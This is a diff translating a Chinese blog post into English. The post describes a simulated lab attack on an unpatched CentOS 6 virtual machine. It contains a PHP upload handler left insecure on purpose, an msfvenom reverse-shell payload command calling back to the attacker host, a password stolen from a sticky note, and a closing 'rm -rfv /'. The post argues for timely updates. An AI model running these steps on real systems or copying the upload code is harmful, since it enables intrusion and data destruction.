@@ -1,12 +1,12 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="">
     <head>
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="robots" content="noodp" />
         <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
-        <title>攻击 CentOS6 虚拟机 - WeepingDogel</title><meta name="Description" content="关于更新的意义..."><meta property="og:title" content="攻击 CentOS6 虚拟机" />
-<meta property="og:description" content="关于更新的意义..." />
+        <title>Attacking CentOS6 Virtual Machines - WeepingDogel</title><meta name="Description" content="The meaning of updates..."><meta property="og:title" content="Attacking CentOS6 Virtual Machines" />
+<meta property="og:description" content="The meaning of updates..." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://weepingdogel.github.io/posts/2020-09-26/" /><meta property="og:image" content="http://weepingdogel.github.io/photo_2021-07-21_03-31-50.jpg"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2020-09-26T13:14:18+08:00" />
@@ -14,27 +14,27 @@
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="http://weepingdogel.github.io/photo_2021-07-21_03-31-50.jpg"/>
 
-<meta name="twitter:title" content="攻击 CentOS6 虚拟机"/>
-<meta name="twitter:description" content="关于更新的意义..."/>
+<meta name="twitter:title" content="Attacking CentOS6 Virtual Machines"/>
+<meta name="twitter:description" content="The meaning of updates..."/>
 <meta name="application-name" content="LoveIt">
 <meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://weepingdogel.github.io/posts/2020-09-26/" /><link rel="prev" href="http://weepingdogel.github.io/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/" /><link rel="next" href="http://weepingdogel.github.io/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><meta name="google-site-verification" content="twaX9bmrayAeCFiSLFsfosnmEjKpOlWNLIYKt5ZIno4" /><script type="application/ld+json">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://weepingdogel.github.io/posts/2020-09-26/" /><link rel="prev" href="http://weepingdogel.github.io/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/" /><link rel="next" href="http://weepingdogel.github.io/posts/2020-nov-6/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><meta name="google-site-verification" content="twaX9bmrayAeCFiSLFsfosnmEjKpOlWNLIYKt5ZIno4" /><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
-        "headline": "攻击 CentOS6 虚拟机",
-        "inLanguage": "zh-CN",
+        "headline": "Attacking CentOS6 Virtual Machines",
+        "inLanguage": "",
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "http:\/\/weepingdogel.github.io\/posts\/2020-09-26\/"
-        },"genre": "posts","keywords": "Linux, 想法, 随笔, 渗透测试, 社工, 黑客, 更新","wordcount":  1931 ,
+        },"genre": "posts","keywords": "Linux, Thoughts, Essays, Penetration testing, Social engineering, Hackers, Updates","wordcount":  1434 ,
         "url": "http:\/\/weepingdogel.github.io\/posts\/2020-09-26\/","datePublished": "2020-09-26T13:14:18+08:00","dateModified": "2020-09-26T13:14:18+08:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
                 "@type": "Person",
                 "name": "WeepingDogel"
-            },"description": "关于更新的意义..."
+            },"description": "The meaning of updates..."
     }
     </script></head>
     <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
@@ -52,7 +52,9 @@
         title="/photo_2021-07-21_03-31-50.jpg" />WeepingDogel</a>
         </div>
         <div class="menu">
-            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/notes/"> 笔记 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About Me </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="Select Language"><i class="fas fa-chevron-right fa-fw"></i>
+                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/zh-cn/posts/2020-09-26/">简体中文</option><option value="/posts/2020-09-26/" selected></option></select>
+                    </a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                     <i class="fas fa-adjust fa-fw"></i>
                 </a>
             </div>
@@ -75,9 +77,11 @@
                 <span></span><span></span><span></span>
             </div>
         </div>
-        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/notes/" title="">笔记</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About Me</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                 <i class="fas fa-adjust fa-fw"></i>
-            </a></div>
+            </a><a href="javascript:void(0);" class="menu-item" title="Select Language"><i class="fas fa-chevron-right fa-fw"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/zh-cn/posts/2020-09-26/">简体中文</option><option value="/posts/2020-09-26/" selected></option></select>
+                </a></div>
     </div>
 </header>
 <div class="search-dropdown desktop">
@@ -88,12 +92,12 @@
 </div>
 <main class="main">
                 <div class="container"><div class="toc" id="toc-auto">
-            <h2 class="toc-title">目录</h2>
+            <h2 class="toc-title">Contents</h2>
             <div class="toc-content" id="toc-content-auto"></div>
-        </div><article class="page single"><h1 class="single-title animated flipInX">攻击 CentOS6 虚拟机</h1><div class="post-meta">
-            <div class="post-meta-line"><span class="post-author"><a href="https://weepingdogel.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>WeepingDogel</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="far fa-folder fa-fw"></i>渗透测试</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-09-26">2020-09-26</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1931 字&nbsp;
-                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 4 分钟&nbsp;</div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Attacking CentOS6 Virtual Machines</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://weepingdogel.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>WeepingDogel</a></span>&nbsp;<span class="post-category">included in <a href="/categories/penetration-testing/"><i class="far fa-folder fa-fw"></i>Penetration testing</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-09-26">2020-09-26</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1434 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;7 minutes&nbsp;</div>
         </div><div class="featured-image"><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -101,45 +105,40 @@
         data-srcset="https://w.wallhaven.cc/full/5w/wallhaven-5we787.jpg, https://w.wallhaven.cc/full/5w/wallhaven-5we787.jpg 1.5x, https://w.wallhaven.cc/full/5w/wallhaven-5we787.jpg 2x"
         data-sizes="auto"
         alt="https://w.wallhaven.cc/full/5w/wallhaven-5we787.jpg"
-        title="关于更新的意义..." /></div><div class="details toc" id="toc-static"  kept="">
+        title="The meaning of updates..." /></div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
-                    <span>目录</span>
+                    <span>Contents</span>
                     <span><i class="details-icon fas fa-angle-right"></i></span>
                 </div>
                 <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
     <li>
       <ul>
-        <li><a href="#序">序</a></li>
-        <li><a href="#模拟环境">模拟环境</a></li>
-        <li><a href="#攻击过程">攻击过程</a></li>
-        <li><a href="#结语">结语</a></li>
+        <li><a href="#the-reason-for-writing-this-blog-post">The reason for writing this blog post</a></li>
+        <li><a href="#simulation-environment">Simulation Environment</a></li>
+        <li><a href="#process-of-attack">Process of attack</a></li>
+        <li><a href="#conclusion">Conclusion</a></li>
       </ul>
     </li>
   </ul>
 </nav></div>
             </div><div class="content" id="content"><blockquote>
-<p>虽然存在渗透过程，但是本篇主题不是渗透，请理性阅读。</p>
+<p>Although the penetration process is involved, this article&rsquo;s main topic is not about penetration testing. Please read it with a rational mindset.</p>
 </blockquote>
-<h2 id="序">序</h2>
-<p>最近总听到一些声音。</p>
-<p>一些关于软件更新的、不同的声音。</p>
-<p>一边说：在某些情况下，更新不好，会带来不必要的工作量，甚至重写</p>
-<p>另一边说：持续不断的更新才能带来更好的体验</p>
-<p>我不知道哪一边是对的，但有点好奇</p>
-<p>我好奇如果不更新会怎样，所以我做了这件事：用虚拟机模拟一个商业公司的服务器，系统为 CentOS 6，尝试使用一些工具试着去攻击。</p>
-<p>只是想模拟一家公司在 2020 年使用 CentOS 6.0 被黑客盯上了会怎么样。</p>
-<h2 id="模拟环境">模拟环境</h2>
+<h2 id="the-reason-for-writing-this-blog-post">The reason for writing this blog post</h2>
+<p>Recently, I have been hearing different opinions on software updates. On one hand, some argue that in certain cases, updating can be counterproductive, leading to unnecessary workload or even rewriting. On the other hand, others argue that continuous updates are necessary for a better user experience.</p>
+<p>I am not sure which side is right, but I am curious. I wanted to know what would happen if I do not update software, so I took it upon myself to simulate an attack on a commercial company&rsquo;s server using a virtual machine. The system used was CentOS 6, and I attempted to use various tools to try and breach its security.</p>
+<p>My goal was to simulate what could happen if a company were to be targeted by hackers while still using CentOS 6.0 in 2020.</p>
+<h2 id="simulation-environment">Simulation Environment</h2>
 <blockquote>
-<p>攻击者平台: Arch Linux</p>
+<p>Attacker platform: Arch Linux</p>
 <p>IP: 192.168.0.109</p>
-<p>受害平台: CentOS 6.1 on VirtualBox</p>
+<p>Victim platform: CentOS 6.1 on VirtualBox</p>
 <p>IP: 192.168.0.116</p>
 </blockquote>
-<p><strong>假如</strong>这是一家由非技术人员领导技术人员的公司，很长一段时间没有更新过开发时使用的软件（包括开发机、服务器的操作系统）</p>
-<p>我们将这个虚拟机想象为他们的服务器，然后进行一些攻击测试。</p>
-<p>由于这家公司的管理层是非技术人员，因此服务器的软件不仅版本老旧，且缺乏防御措施。</p>
-<p>外加公司有点不尽人意的工时，程序员们都以“完成任务”的摸鱼态度工作，导致后端 PHP 写成了这样</p>
+<p><strong>Suppose</strong> this is a company where non-technical personnel lead the technical staff, and they have not updated the software used in development (including the operating system of their development machines and servers) for a long time.</p>
+<p>We can imagine this virtual machine as their server and conduct some attack tests on it. Because the management of this company is non-technical, the software on the server not only has outdated versions but also lacks any defensive measures.</p>
+<p>Additionally, due to unsatisfactory work hours, the programmers have a &ldquo;get the job done&rdquo; attitude, resulting in PHP code on the backend such as this:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -162,25 +161,25 @@
 <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;error&#34;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;错误：&#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;error&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Error: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;error&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="k">else</span>
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;上传文件名: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;文件类型: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;type&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;文件大小: &#34;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;size&#34;</span><span class="p">]</span> <span class="o">/</span> <span class="mi">1024</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34; kB&lt;br&gt;&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;文件临时存储的位置: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Uploaded file name: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;File type: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;type&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;File size: &#34;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;size&#34;</span><span class="p">]</span> <span class="o">/</span> <span class="mi">1024</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34; kB&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;Temporary storage location of file: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">    <span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">],</span> <span class="s2">&#34;upload/&#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]);</span>
-</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;文件存储在: &#34;</span> <span class="o">.</span> <span class="s2">&#34;upload/&#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;File stored in: &#34;</span> <span class="o">.</span> <span class="s2">&#34;upload/&#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><blockquote>
-<p>由于条件有限，只能模拟到这个程度，但我个人认为<del>足以进行抽象测试了</del>(逃</p>
+<p>Although the simulation has limitations, I personally believe that it is sufficient for abstract testing purposes.</p>
 </blockquote>
-<h2 id="攻击过程">攻击过程</h2>
-<p>总有人喜欢搞破坏，一名黑客对服务器进行了扫描&hellip;</p>
+<h2 id="process-of-attack">Process of attack</h2>
+<p>Someone always likes to cause trouble, and a hacker has scanned the server&hellip;</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -189,7 +188,7 @@
 <pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo nmap -O -v 192.168.0.116
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>结果是这样的</p>
+</div><p>The result is as follows:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -236,9 +235,8 @@
 </span></span><span class="line"><span class="cl">           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>他惊讶地发现内核版本居然才 <code>2.6.32</code>，这样的事他还是第一次见。</p>
-<p>除此之外，开放的端口有 SSH 、 HTTP ，这给了他很好的机会。</p>
-<p>他试图访问了网站，在网站上发现了一个文件上传点。</p>
+</div><p>He was surprised to find that the kernel version was only <code>2.6.32</code>, which was a first for him. In addition, there were open ports for SSH and HTTP, which gave him a good opportunity.</p>
+<p>He attempted to access the website and discovered a file upload point on the site.</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -247,7 +245,7 @@
         data-sizes="auto"
         alt="/img/2020-09-26_21-18.png"
         title="/img/2020-09-26_21-18.png" /></p>
-<p>抱着试试看的态度，用 msf 生成了一个 payload</p>
+<p>With a &ldquo;let&rsquo;s give it a try&rdquo; attitude, he generated a payload using msf.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -256,7 +254,7 @@
 <pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfvenom -p php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.0.109 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -o shell.php
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>选择了文件，点击上传惊奇地发现，不止上传成功，还被告知了位置
+</div><p>He selected a file and clicked upload, and was surprised to find that not only was the upload successful, but he was also informed of its location.
 <img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -265,7 +263,7 @@
         data-sizes="auto"
         alt="/img/2020-09-26_21-22.png"
         title="/img/2020-09-26_21-22.png" /></p>
-<p>于是他启动了 <code>msfconsole</code></p>
+<p>So he launched <code>msfconsole</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -274,7 +272,7 @@
 <pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfconsole
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>并使用  <code>exploit/multi/handler</code> 这个模块</p>
+</div><p>And he used the exploit/multi/handler module.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -283,7 +281,7 @@
 <pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf5 &gt; use exploit/multi/handler 
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>依次设置好参数</p>
+</div><p>He then proceeded to set the parameters one by one.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -308,7 +306,7 @@
 <pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set payload php/meterpreter/reverse_tcp
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>最后一步就是运行模块了，</p>
+</div><p>The final step was to run the module.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -317,7 +315,7 @@
 <pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf5 exploit(multi/handler) &gt; run
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>然后 msf 开始监听。</p>
+</div><p>Then msf began listening.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -328,11 +326,11 @@
 </span></span><span class="line"><span class="cl">[*] Started reverse TCP handler on 192.168.0.109:4444 
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>这时他将提示出的文件地址和链接改一下，并访问</p>
+</div><p>At this point, he modified the file address and link as prompted and accessed it:</p>
 <blockquote>
 <p><code>http://192.168.0.116/upload/shell.php</code></p>
 </blockquote>
-<p>msf 立刻就有了结果，可想而知，服务器的安全措施有多差</p>
+<p>Msf immediately produced results. It&rsquo;s easy to imagine how poor the server&rsquo;s security measures were.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -349,10 +347,7 @@
 </span></span><span class="line"><span class="cl">meterpreter &gt; 
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>现在他开始获取系统简要信息</p>
-<ul>
-<li>系统、内核版本</li>
-</ul>
+</div><p>Now he began retrieving brief system information, such as the <code>operating system</code> and <code>kernel version</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -373,9 +368,7 @@
 </span></span><span class="line"><span class="cl">Kernel \r on an \m
 </span></span></code></pre></td></tr></table>
 </div>
-</div><ul>
-<li>当前控制的用户权限</li>
-</ul>
+</div><p>He also attempted to determine the current user&rsquo;s privileges.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -386,15 +379,15 @@
 </span></span><span class="line"><span class="cl">Server username: apache (48)
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>权限还是很低的，尽管无法做一些让公司损失大的事情，但至少能够偷窥和搞破坏了，不过黑客会就此满足吗？ 答案是不会，因为他还想要提权，获取 root 权限，这样便能为所欲为了。</p>
-<p>由于这台服务器的系统与内核过于老旧，大多数复现漏洞的代码要么只在3.x 以上的内核版本中有效，要么无法编译。</p>
-<p>看起来他需要想想其他办法。</p>
-<p>他在白天骑着摩托穿街过巷送外卖，夜晚则是游走网络间的黑客。</p>
-<p>一次偶然的机会，他去送那个公司的员工订的外卖，进入办公区时，无意之间看到贴在显示器上的便签。</p>
-<p>上面写着一些数字和字母，也许是什么有用的东西。</p>
-<p>趁着员工们用餐，他用手机偷偷将便签拍了下来便离开了。</p>
-<p>比较巧的是，这张便签是刚换的密码，需要再隔一段时间才会更改。</p>
-<p>下班后回到终端，尝试着用偷窥来的密码直接登陆 root</p>
+</div><p>The permissions are still quite low, so while he may not be able to do anything that would cause significant damage to the company, he can still spy and wreak havoc. But would the hacker be satisfied with just that? The answer is no, because he wants to escalate his privileges and obtain root access, which would allow him to do whatever he wants.</p>
+<p>Due to the fact that the system and kernel of this server are too outdated, most of the code used to exploit vulnerabilities only works on kernel versions 3.x or above, or cannot be compiled at all.</p>
+<p>It looks like he needs to think of another way.</p>
+<p>During the day, he rides his motorcycle through the streets and alleys delivering food, and at night he roams the network as a hacker.</p>
+<p>By chance, he went to deliver food ordered by an employee of that company and, as he entered the office area, he accidentally saw a note stuck to a monitor.</p>
+<p>There were some numbers and letters written on it, perhaps something useful.</p>
+<p>While the employees were eating, he secretly took a picture of the note with his phone and left.</p>
+<p>As luck would have it, this note contained the password that had just been changed and would not be updated again for a while.</p>
+<p>After work, he returned to his terminal and attempted to log in directly as root using the stolen password.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -407,7 +400,7 @@
 </span></span><span class="line"><span class="cl">Channel 2 created.
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>获得交互 shell</p>
+</div><p>He was able to obtain an interactive shell.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -424,7 +417,7 @@
 </span></span><span class="line"><span class="cl">bash-4.1$ 
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>进行登录</p>
+</div><p>He logged in successfully.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -441,7 +434,7 @@
 </span></span><span class="line"><span class="cl">[root@localhost upload]# 
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>可见，一口气便登录成功，root 权限到了他的手里。</p>
+</div><p>As we can see, he was able to log in successfully with ease, and now he has root privileges at his fingertips.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -462,8 +455,8 @@
 </span></span><span class="line"><span class="cl">[root@localhost upload]# 
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>接下来他便可以为所欲为了..</p>
-<p>对，他最后进行了删库</p>
+</div><p>Yes, he could do whatever he wanted now&hellip;</p>
+<p>And so, in the end, he proceeded to delete everything.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -472,64 +465,62 @@
 <pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[root@localhost upload]# rm -rfv /
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>最后导致公司损失巨大..</p>
-<h2 id="结语">结语</h2>
-<p>虽然以上的故事纯属虚构，攻击也只是在模拟环境进行的。</p>
-<p>但却值得我们思考，就我们能看到的来看&hellip;</p>
+</div><p>The company suffered significant losses as a result.</p>
+<h2 id="conclusion">Conclusion</h2>
+<p>Although the story above is purely fictional and the attack was only carried out in a simulated environment, it is worth pondering over what we can see&hellip;</p>
 <ul>
-<li>系统不更新容易被攻击</li>
-<li>代码不更新容易出漏洞</li>
-<li>密码更新太慢容易泄露</li>
-<li>漏洞以更新来修复，不修则被利用</li>
+<li>Systems that are not updated are prone to attacks.</li>
+<li>Code that is not updated is prone to vulnerabilities.</li>
